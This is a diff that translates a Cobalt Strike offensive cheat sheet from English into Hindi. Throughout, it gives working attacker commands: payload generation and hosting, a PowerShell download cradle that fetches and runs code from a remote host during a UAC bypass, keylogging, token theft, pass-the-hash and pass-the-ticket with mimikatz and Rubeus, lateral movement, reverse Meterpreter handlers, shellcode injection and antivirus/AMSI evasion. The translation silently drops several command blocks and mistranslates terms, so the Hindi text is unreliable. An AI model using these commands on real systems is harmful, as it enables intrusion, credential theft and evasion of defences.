@@ -1,217 +1,174 @@
 # Cobalt Strike
 
-### Listeners
+### सुनवाईकर्ता
 
-### C2 Listeners
+### सी2 सुनवाईकर्ता
 
-`Cobalt Strike -> Listeners -> Add/Edit` then you can select where to listen, which kind of beacon to use (http, dns, smb...) and more.
+`Cobalt Strike -> सुनवाईकर्ता -> जोड़ें/संपादित करें` फिर आप कहां सुनना चाहते हैं, किस प्रकार के बीकन का उपयोग करना चाहते हैं (http, dns, smb...) और अधिक का चयन कर सकते हैं।
 
-### Peer2Peer Listeners
+### पीयर2पीयर सुनवाईकर्ता
 
-The beacons of these listeners don't need to talk to the C2 directly, they can communicate to it through other beacons.
+इन सुनवाईकर्ताओं के बीकनों को सी2 के साथ सीधे बातचीत करने की आवश्यकता नहीं होती है, वे इसके माध्यम से इससे संवाद कर सकते हैं।
 
-`Cobalt Strike -> Listeners -> Add/Edit` then you need to select the TCP or SMB beacons
+`Cobalt Strike -> सुनवाईकर्ता -> जोड़ें/संपादित करें` फिर आपको TCP या SMB बीकन का चयन करना होगा
 
-* The **TCP beacon will set a listener in the port selected**. To connect to a TCP beacon use the command `connect <ip> <port>` from another beacon
-* The **smb beacon will listen in a pipename with the selected name**. To connect to a SMB beacon you need to use the command `link [target] [pipe]`.
+* **TCP बीकन चयनित पोर्ट में एक सुनवाईकर्ता सेट करेगा**। एक TCP बीकन से कनेक्ट करने के लिए दूसरे बीकन से `connect <ip> <port>` कमांड का उपयोग करें
+* **smb बीकन चयनित नाम के पाइपमें सुनेगा**। SMB बीकन से कनेक्ट करने के लिए आपको `link [target] [pipe]` कमांड का उपयोग करना होगा।
 
-### Generate & Host payloads
+### पेलोड उत्पन्न करें और होस्ट करें
 
-#### Generate payloads in files
+#### फ़ाइलों में पेलोड उत्पन्न करें
 
-`Attacks -> Packages ->`&#x20;
+`हमले -> पैकेज ->`&#x20;
 
-* **`HTMLApplication`** for HTA files
-* **`MS Office Macro`** for an office document with a macro
-* **`Windows Executable`** for a .exe, .dll orr service .exe
-* **`Windows Executable (S)`** for a **stageless** .exe, .dll or service .exe (better stageless than staged, less IoCs)
+* **`HTMLApplication`** HTA फ़ाइलों के लिए
+* **`MS Office Macro`** मैक्रो के साथ एक ऑफ़िस दस्तावेज़ के लिए
+* **`Windows Executable`** .exe, .dll या सेवा .exe के लिए
+* **`Windows Executable (S)`** एक **stageless** .exe, .dll या सेवा .exe के लिए (स्टेजलेस स्टेज्ड से बेहतर है, कम IoC)
 
-#### Generate & Host payloads
+#### पेलोड उत्पन्न करें और होस्ट करें
 
-`Attacks -> Web Drive-by -> Scripted Web Delivery (S)` This will generate a script/executable to download the beacon from cobalt strike in formats such as: bitsadmin, exe, powershell and python
+`हमले -> वेब ड्राइव-बाई -> स्क्रिप्टेड वेब वितरण (S)` इससे एक स्क्रिप्ट/एक्सीक्यूटेबल उत्पन्न होगा जो कोबाल्ट स्ट्राइक से बीकन को डाउनलोड करने के लिए होगा, जैसे: bitsadmin, exe, powershell और python
 
-#### Host Payloads
+#### पेलोड होस्ट करें
 
-If you already has the file you want to host in a web sever just go to `Attacks -> Web Drive-by -> Host File` and select the file to host and web server config.
+यदि आपके पास पेश करने के लिए वेब सर्वर में रखने की फ़ाइल है, तो केवल `हमले -> वेब ड्राइव-बाई -> फ़ाइल होस्ट` पर जाएं और होस्ट करने के लिए फ़ाइल का चयन करें और वेब सर्वर कॉन्फ़िगरेशन करें।
 
-### Beacon Options
+### बीकन विकल्प
 
-<pre class="language-bash"><code class="lang-bash"># Execute local .NET binary
+<pre class="language-bash"><code class="lang-bash"># स्थानीय .NET बाइनरी को निष्पादित करें
 execute-assembly &#x3C;/path/to/executable.exe>
 
-# Screenshots
-printscreen    # Take a single screenshot via PrintScr method
-screenshot     # Take a single screenshot
-screenwatch    # Take periodic screenshots of desktop
-## Go to View -> Screenshots to see them
+# स्क्रीनशॉट
+printscreen    # प्रिंटस्क्रीन विधि के माध्यम से एकल स्क्रीनशॉट लें
+screenshot     # एकल स्क्रीनशॉट लें
+screenwatch    # डेस्कटॉप के नियमित अंतराल पर स्क्रीनशॉट लें
+## उन्हें देखने के लिए व्यू -> स्क्रीनशॉट पर जाएं
 
-# keylogger
+# कीलॉगर
 keylogger [pid] [x86|x64]
-## View > Keystrokes to see the keys pressed
+## कुंजीस्पर्श को देखने के लिए व्यू > कीस्ट्रोक्स पर जाएं
 
-# portscan
-portscan [pid] [arch] [targets] [ports] [arp|icmp|none] [max connections] # Inject portscan action inside another process
+# पोर्टस्कैन
+portscan [pid] [arch] [targets] [ports] [arp|icmp|none] [max connections] # दूसरे प्रक्रिया में पोर्टस्कैन क्रिया इंजेक्ट करें
 portscan [targets] [ports] [arp|icmp|none] [max connections]
 
-# Powershell
-# Import Powershell module
+# पावरशेल
+# पावरशेल मॉड्यूल आयात करें
 powershell-import C:\path\to\PowerView.ps1
-powershell &#x3C;just write powershell cmd here>
+powershell &#x3C;यहां पावरशेल कमांड लिखें>
 
-# User impersonation
-## Token generation with creds
-make_token [DOMAIN\user] [password] #Create token to impersonate a user in the network
-ls \\computer_name\c$ # Try to use generated token to access C$ in a computer
-rev2self # Stop using token generated with make_token
-## The use of make_token generates event 4624: An account was successfully logged on.  This event is very common in a Windows domain, but can be narrowed down by filtering on the Logon Type.  As mentioned above, it uses LOGON32_LOGON_NEW_CREDENTIALS which is type 9.
+# उपयोगकर्ता अनुकरण
+## क्रेडेंशियल के साथ टोकन उत्पन्न करें
+make_token [DOMAIN\user] [password] # नेटवर्क में एक उपयोगकर्ता के रूप में अनुकरण करने के लिए टोकन बनाएं
+ls \\computer_name\c$ # एक कंप्यूटर में C$ तक पहुँचने के लिए उत्पन्न टोकन का उपयोग करने का प्रयास करें
+rev2self # make_token के साथ उत्पन्न टोकन का उपयोग करना बंद करें
+## make_token का उपयोग ईवेंट 4624 उत्पन्न करता है: एक खाता सफलतापूर्वक लॉग ऑन हुआ था। यह ईवेंट विंडोज डोमेन में बहुत सामान्य है, लेकिन लॉगऑन प्रकार पर फ़िल्टर करके इसे संक्षेप में किया जा सकता है। जैसा कि पहले कहा गया है, इसमें LOGON32_LOGON_NEW_CREDENTIALS का उपयोग होता है जो प्रकार 9 है।
 
-# UAC Bypass
-elevate svc-exe &#x3C;listener>
-elevate uac-token-duplication &#x3C;listener>
+# UAC बाईपास
+elevate svc-exe &#x3C;सुनवाईकर्ता>
+elevate uac-token-duplication &#x3C;सुनवाईकर्ता>
 runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
 
-## Steal token from pid
-## Like make_token but stealing the token from a process
-steal_token [pid] # Also, this is useful for network actions, not local actions
-## From the API documentation we know that this logon type "allows the caller to clone its current token". This is why the Beacon output says Impersonated &#x3C;current_username> - it's impersonating our own cloned token.
-ls \\computer_name\c$ # Try to use generated token to access C$ in a computer
-rev2self # Stop using token from steal_token
-
-## Launch process with nwe credentials
-spawnas [domain\username] [password] [listener] #Do it from a directory with read access like: cd C:\
-## Like make_token, this will generate Windows event 4624: An account was successfully logged on but with a logon type of 2 (LOGON32_LOGON_INTERACTIVE).  It will detail the calling user (TargetUserName) and the impersonated user (TargetOutboundUserName).
-
-## Inject into process
-inject [pid] [x64|x86] [listener]
-## From an OpSec point of view: Don't perform cross-platform injection unless you really have to (e.g. x86 -> x64 or x64 -> x86).
-
-## Pass the hash
-## This modification process requires patching of LSASS memory which is a high-risk action, requires local admin privileges and not all that viable if Protected Process Light (PPL) is enabled.
-pth [pid] [arch] [DOMAIN\user] [NTLM hash]
-pth [DOMAIN\user] [NTLM hash]
-
-## Pass the hash through mimikatz
-mimikatz sekurlsa::pth /user:&#x3C;username> /domain:&#x3C;DOMAIN> /ntlm:&#x3C;NTLM HASH> /run:"powershell -w hidden"
-## Withuot /run, mimikatz spawn a cmd.exe, if you are running as a user with Desktop, he will see the shell (if you are running as SYSTEM you are good to go)
-steal_token &#x3C;pid> #Steal token from process created by mimikatz
-
-## Pass the ticket
-## Request a ticket
-execute-assembly C:\path\Rubeus.exe asktgt /user:&#x3C;username> /domain:&#x3C;domain> /aes256:&#x3C;aes_keys> /nowrap /opsec
-## Create a new logon session to use with the new ticket (to not overwrite the compromised one)
-make_token &#x3C;domain>\&#x3C;username> DummyPass
-## Write the ticket in the attacker machine from a poweshell session &#x26; load it
-[System.IO.File]::WriteAllBytes("C:\Users\Administrator\Desktop\jkingTGT.kirbi", [System.Convert]::FromBase64String("[...ticket...]"))
-kerberos_ticket_use C:\Users\Administrator\Desktop\jkingTGT.kirbi
-
-## Pass the ticket from SYSTEM
-## Generate a new process with the ticket
+## प्रक्रिया से टोकन चुरा लें
+## make_token की तरह, लेकिन प्रक्रिया से
+## SYSTEM से टिकट पास करें
+## टिकट के साथ एक नया प्रक्रिया उत्पन्न करें
 execute-assembly C:\path\Rubeus.exe asktgt /user:&#x3C;USERNAME> /domain:&#x3C;DOMAIN> /aes256:&#x3C;AES KEY> /nowrap /opsec /createnetonly:C:\Windows\System32\cmd.exe
-## Steal the token from that process
+## उस प्रक्रिया से टोकन चुराएं
 steal_token &#x3C;pid>
 
-## Extract ticket + Pass the ticket
-### List tickets
+## टिकट + टिकट पास निकालें
+### टिकट सूची बनाएं
 execute-assembly C:\path\Rubeus.exe triage
-### Dump insteresting ticket by luid
+### luid द्वारा दिलचस्प टिकट डंप करें
 execute-assembly C:\path\Rubeus.exe dump /service:krbtgt /luid:&#x3C;luid> /nowrap
-### Create new logon session, note luid and processid
+### नई लॉगऑन सत्र बनाएं, luid और processid का ध्यान रखें
 execute-assembly C:\path\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe
-### Insert ticket in generate logon session
+### उत्पन्न लॉगऑन सत्र में टिकट डालें
 execute-assembly C:\path\Rubeus.exe ptt /luid:0x92a8c /ticket:[...base64-ticket...]
-### Finally, steal the token from that new process
+### अंत में, उस नई प्रक्रिया से टोकन चुराएं
 steal_token &#x3C;pid>
 
-# Lateral Movement
-## If a token was created it will be used
+# लैटरल मूवमेंट
+## यदि टोकन बनाया गया है तो उसका उपयोग किया जाएगा
 jump [method] [target] [listener]
-## Methods:
-## psexec                    x86   Use a service to run a Service EXE artifact
-## psexec64                  x64   Use a service to run a Service EXE artifact
-## psexec_psh                x86   Use a service to run a PowerShell one-liner
-## winrm                     x86   Run a PowerShell script via WinRM
-## winrm64                   x64   Run a PowerShell script via WinRM
+## विधियाँ:
+## psexec                    x86   सेवा का उपयोग करके एक सेवा EXE आर्टिफैक्ट चलाने के लिए
+## psexec64                  x64   सेवा का उपयोग करके एक सेवा EXE आर्टिफैक्ट चलाने के लिए
+## psexec_psh                x86   सेवा का उपयोग करके एक PowerShell वन-लाइनर चलाने के लिए
+## winrm                     x86   WinRM के माध्यम से एक PowerShell स्क्रिप्ट चलाएं
+## winrm64                   x64   WinRM के माध्यम से एक PowerShell स्क्रिप्ट चलाएं
 
 remote-exec [method] [target] [command]
-## Methods:
-<strong>## psexec                          Remote execute via Service Control Manager
-</strong>## winrm                           Remote execute via WinRM (PowerShell)
-## wmi                             Remote execute via WMI
+## विधियाँ:
+<strong>## psexec                          सेवा नियंत्रण प्रबंधक के माध्यम से रिमोट एक्जीक्यूट करें
+</strong>## winrm                           WinRM के माध्यम से रिमोट एक्जीक्यूट करें (PowerShell)
+## wmi                             WMI के माध्यम से रिमोट एक्जीक्यूट करें
 
-## To execute a beacon with wmi (it isn't ins the jump command) just upload the beacon and execute it
+## WMI के साथ एक बीकन निष्पादित करने के लिए (यह जंप कमांड में नहीं है) बस बीकन अपलोड करें और इसे निष्पादित करें
 beacon> upload C:\Payloads\beacon-smb.exe
 beacon> remote-exec wmi srv-1 C:\Windows\beacon-smb.exe
 
 
-# Pass session to Metasploit - Through listener
-## On metaploit host
+# Metasploit को सत्र पास करें - लिस्टनर के माध्यम से
+## Metaploit होस्ट पर
 msf6 > use exploit/multi/handler
 msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_http
 msf6 exploit(multi/handler) > set LHOST eth0
 msf6 exploit(multi/handler) > set LPORT 8080
 msf6 exploit(multi/handler) > exploit -j
 
-## On cobalt: Listeners > Add and set the Payload to Foreign HTTP. Set the Host to 10.10.5.120, the Port to 8080 and click Save.
+## Cobalt पर: Listeners > Add और Payload को Foreign HTTP पर सेट करें। Host को 10.10.5.120, Port को 8080 सेट करें और Save पर क्लिक करें।
 beacon> spawn metasploit
-## You can only spawn x86 Meterpreter sessions with the foreign listener.
+## आप केवल विदेशी लिस्टनर के साथ x86 Meterpreter सत्र उत्पन्न कर सकते हैं।
 
-# Pass session to Metasploit - Through shellcode injection
-## On metasploit host
+# Metasploit सत्र को cobalt strike को पास करें - शेलकोड इंजेक्शन के माध्यम से
+## Metasploit होस्ट पर
 msfvenom -p windows/x64/meterpreter_reverse_http LHOST=&#x3C;IP> LPORT=&#x3C;PORT> -f raw -o /tmp/msf.bin
-## Run msfvenom and prepare the multi/handler listener
+## msfvenom चलाएं और multi/handler लिस्टनर को तैयार करें
 
-## Copy bin file to cobalt strike host
+## बिन फ़ाइल को cobalt strike होस्ट में कॉपी करें
 ps
 shinject &#x3C;pid> x64 C:\Payloads\msf.bin #Inject metasploit shellcode in a x64 process
 
-# Pass metasploit session to cobalt strike
-## Fenerate stageless Beacon shellcode, go to Attacks > Packages > Windows Executable (S), select the desired listener, select Raw as the Output type and select Use x64 payload.
-## Use post/windows/manage/shellcode_inject in metasploit to inject the generated cobalt srike shellcode
+# Metasploit सत्र को cobalt strike को पास करें
+## निर्मित Beacon शेलकोड उत्पन्न करें, Attacks > Packages > Windows Executable (S) पर जाएं, वांछित लिस्टनर का चयन करें, आउटपुट प्रकार के रूप में Raw का चयन करें और Use x64 payload का चयन करें।
+## Metasploit में post/windows/manage/shellcode_inject का उपयोग करें जिससे उत्पन्न किया गया cobalt srike shellcode इंजेक्ट होता है
 
 
-# Pivoting
-## Open a socks proxy in the teamserver
+# पिवटिंग
+## टीमसर्वर में एक सॉक्स प्रॉक्सी खोलें
 beacon> socks 1080
 
-# SSH connection
+# SSH कनेक्शन
 beacon> ssh 10.10.17.12:22 username password</code></pre>
 
-## Avoiding AVs
+## AVs से बचें
 
 ### Artifact Kit
 
-Usually in `/opt/cobaltstrike/artifact-kit` you can find the code and pre-compiled templates (in `/src-common`) of the payloads that cobalt strike is going to use to generate the binary beacons.
+आमतौर पर `/opt/cobaltstrike/artifact-kit` में आपको कोबाल्ट स्ट्राइक द्वारा उत्पन्न बाइनरी बीकन के कोड और पूर्व-संकलित टेम्पलेट (`/src-common` में) मिलेंगे।
 
-Using [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck) with the generated backdoor (or just with the compiled template) you can find what is making defender trigger. It's usually a string. Therefore you can just modify the code that is generating the backdoor so that string doesn't appear in the final binary.
+[ThreatCheck](https://github.com/rasta-mouse/ThreatCheck) का उपयोग उत्पन्न बैकडोर (या केवल कंपाइल किए गए टेम्पलेट) के साथ करके आप यह जांच सकते हैं कि डिफेंडर को क्या ट्रिगर कर रहा है। आमतौर पर यह एक स्ट्रिंग होती है। इसलिए आप बैकडोर उत्पन्न कर रहे कोड में उस स्ट्रिंग को नहीं दिखने देने के लिए संशोधित कर सकते हैं।
 
-After modifying the code just run `./build.sh` from the same directory and copy the `dist-pipe/` folder into the Windows client in `C:\Tools\cobaltstrike\ArtifactKit`.
-
+कोड को संशोधित करने के बाद उसी निर्देशिका से `./build.sh` चलाएं और `dist-pipe/` फ़ोल्डर को Windows क्लाइंट में `C:\Tools\cobaltstrike\ArtifactKit` में कॉपी करें।
 ```
 pscp -r root@kali:/opt/cobaltstrike/artifact-kit/dist-pipe .
 ```
+यह न भूलें कि आपको विनाशकारी स्क्रिप्ट `dist-pipe\artifact.cna` लोड करना होगा ताकि Cobalt Strike को हमारे द्वारा चयनित डिस्क संसाधनों का उपयोग करने के लिए नहीं करना पड़े।
 
-Don't forget to load the aggressive script `dist-pipe\artifact.cna` to indicate Cobalt Strike to use the resources from disk that we want and not the ones loaded.
+### संसाधन किट
 
-### Resource Kit
+संसाधन किट फ़ोल्डर में Cobalt Strike के स्क्रिप्ट-आधारित पेलोड के टेम्पलेट होते हैं, जिनमें PowerShell, VBA और HTA शामिल हैं।
 
-The ResourceKit folder contains the templates for Cobalt Strike's script-based payloads including PowerShell, VBA and HTA.
-
-Using [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck) with the templates you can find what is defender (AMSI in this case) not liking and modify it:
-
+टेम्पलेट के साथ [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck) का उपयोग करके आप यह जान सकते हैं कि डिफ़ेंडर (इस मामले में AMSI) को क्या पसंद नहीं है और उसे संशोधित कर सकते हैं:
 ```
 .\ThreatCheck.exe -e AMSI -f .\cobaltstrike\ResourceKit\template.x64.ps1
 ```
+डिटेक्ट की गई लाइनों को संशोधित करके एक टेम्पलेट बनाया जा सकता है जो पकड़ा नहीं जाएगा।
 
-Modifying the detected lines one can generate a template that won't be caught.
-
-Don't forget to load the aggressive script `ResourceKit\resources.cna` to indicate Cobalt Strike to luse the resources from disk that we want and not the ones loaded.
-
-
-
-
-
-
-
+याद रखें कि आपको एग्रेसिव स्क्रिप्ट `ResourceKit\resources.cna` लोड करना नहीं भूलना चाहिए ताकि कोबाल्ट स्ट्राइक को बताया जा सके कि हमें डिस्क से रिसोर्सेज़ का उपयोग करना है और न कि लोड किए गए रिसोर्सेज़।
 ```bash
 cd C:\Tools\neo4j\bin
 neo4j.bat console
@@ -233,3 +190,4 @@ pscp -r root@kali:/opt/cobaltstrike/artifact-kit/dist-pipe .
 
 
 ```
+
